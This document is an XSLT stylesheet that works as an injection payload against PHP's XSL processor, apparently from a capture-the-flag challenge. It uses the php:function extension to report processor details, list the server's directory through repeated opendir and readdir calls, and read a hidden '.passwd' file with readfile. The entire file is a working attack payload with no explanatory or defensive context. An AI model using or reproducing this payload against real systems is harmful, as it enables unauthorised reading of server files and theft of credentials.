<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;color:red;background-color:#000000">
        <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <p>
    	Version: <xsl:value-of select="system-property('xsl:version')" />
        
    	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
        
    	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
        
        Dir: <xsl:value-of name="assert" select="php:function('opendir', '.')"/>
            
        Files: 
            
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readfile','.6ff3200bee785801f420fba826ffcdee/.passwd')" />
        <br/>

    

        
        
    </p>
</body>
</html> 
